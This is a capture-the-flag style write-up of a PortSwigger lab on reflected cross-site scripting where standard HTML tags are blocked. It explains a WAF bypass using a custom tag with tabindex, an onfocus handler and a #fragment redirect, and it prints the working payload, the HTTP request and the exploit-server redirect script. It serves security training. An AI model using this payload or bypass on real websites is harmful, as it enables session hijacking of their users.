# LAB: Reflected XSS into HTML context with all standard tags blocked

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Practitioner                                                                                                                   |
| **Date**                    | 2026-11-24                                                                                                                     |
| **Time**                    |                                                                                                                                 |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-html-context-with-all-standard-tags-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked) |

## 1. Objective

Perform a Reflected Cross-Site Scripting (XSS) attack on a search feature protected by a Web Application Firewall (WAF) that blocks all standard HTML tags, exploiting custom HTML elements and event handlers to execute `print()`.

## 2. Surface

- URL query parameter (`/search?search=...`).
- Server-side Web Application Firewall (WAF) filtering standard HTML tags.
- HTML reflection context: User input reflected directly into the page body.

## 3. Hypothesis

If a WAF blocks all standard HTML tags using a static HTML tag blocklist, custom HTML tags (e.g., `<xss>`) may bypass tag filtering while still being parsed as valid DOM elements by modern HTML5 parsers. Combining a custom HTML tag with a globally supported event handler (such as `onfocus`) and an automated focus-triggering mechanism (such as `#` URL hash navigation) will execute JavaScript within the victim context.

## 4. Payload that worked

Request:
```http
GET /?search=%3Ccustom++tabindex%3D%22-1%22+id%3D%22custom%22++onfocus%3D%22alert%28document.cookie%29%22+%3E+Custom+%3C%2Fcustom%3E HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess; cookie test
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


<script> location = 'https://<host>.web-security-academy.net/?search=%3Ccustom++tabindex%3D%22-1%22+id%3D%22custom%22++onfocus%3D%22alert%28document.cookie%29%22+%3E+Custom+%3C%2Fcustom%3E#custom' </script>
```

Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6559

<section class=blog-header>
  <h1>0 search results for '<custom  tabindex="-1" id="custom"  onfocus="alert(document.cookie)" > Custom </custom>'</h1>
  <hr>
</section>
```

## 5. Why it works

Auditing the Web Application Firewall (WAF) using automated tag fuzzing confirmed that all standard HTML tags (`<script>`, `<img>`, `<iframe>`, `<body>`, etc.) were strictly blocked. However, modern HTML5 parsers instantiate any arbitrary, non-standard tag name (such as `<custom>`) into the DOM as an `HTMLUnknownElement`. Because the WAF only maintained a blocklist of standard tags, custom tags bypassed the perimeter filter entirely.

To trigger code execution on a custom HTML element:
1. Custom HTML tags are not natively focusable in the DOM. Adding the `tabindex="-1"` (or `tabindex="1"`) attribute makes the non-standard element focusable, allowing it to receive focus and process the `onfocus` event handler (`<custom tabindex="-1" id="custom" onfocus="alert(document.cookie)">`).
2. Directly embedding the target URL inside an `<iframe>` on the exploit server failed because the target application returned the `X-Frame-Options: SAMEORIGIN` HTTP response header, preventing cross-origin framing.
3. Instead of using an iframe, delivering the attack via `location = 'https://vulnerable-lab.web-security-academy.net/?search=%3Ccustom+tabindex%3D-1+id%3Dcustom+onfocus%3Dalert%28document.cookie%29%3E#custom'` from the exploit server redirects the victim's browser directly to the lab.
4. Appending the URL hash `#custom` targets the `id="custom"` assigned to the custom element. Upon page load, the browser automatically scrolls to and sets DOM focus on the element matching the hash fragment, immediately triggering the `onfocus` event handler and executing `alert(document.cookie)` without requiring victim interaction.

## 6. What I tried that failed

- Injecting standard HTML tags resulted in HTTP 400/403 responses due to the WAF's tag blocklist.
- Creating a custom element with an `onfocus` event handler (`<custom onfocus=alert(document.cookie)>`) reflected cleanly in the DOM but failed to execute because custom elements lack native focusability.
- Adding `tabindex` allowed manual execution upon clicking or hovering over the element, but submitting the URL without automated focus logic failed to solve the lab.
- Attempting to frame the vulnerable page using an `<iframe>` on the exploit server was blocked by the browser due to the `X-Frame-Options: SAMEORIGIN` header in the target response.
- Rule extracted: Custom HTML tags require `tabindex` to become focusable in the DOM. When `X-Frame-Options` blocks iframe delivery, automated interaction-less execution can be achieved via client-side redirection using URL fragment navigation (`#element-id`) to force dynamic focus.

## 7. In a real target (bounty translation)

- Where it shows up: Legacy or custom WAF filters using strict HTML tag blocklists that fail to account for HTML5 custom elements (`<custom-element>`).
- Quick detection: Fuzzing HTML tag names against reflected input parameters to identify unblocked non-standard tag syntax.
- Impact: Reflected XSS execution bypassing perimeter defenses, enabling session hijacking, DOM manipulation, or automated victim exploitation.
- In the report: Detail the WAF blocklist scope, document the custom tag DOM parsing behavior, outline the automated focus delivery mechanism via URL hash, and provide the reproduction steps.

## 8. Bypass / variants noticed

- Using alternative client-side redirection mechanisms on the exploit server (e.g., `window.open()` or `location.href`) combined with URL fragment hashes.
- Applying `autofocus` combined with `tabindex` on browsers or custom element polyfills that support automated focus initialization on custom tags.

## 9. Takeaway

Filters relying on tag blocklists fail to protect against non-standard HTML5 custom elements. Secure implementations must use robust context-aware output encoding or strict HTML sanitization libraries with explicitly defined allowlists.
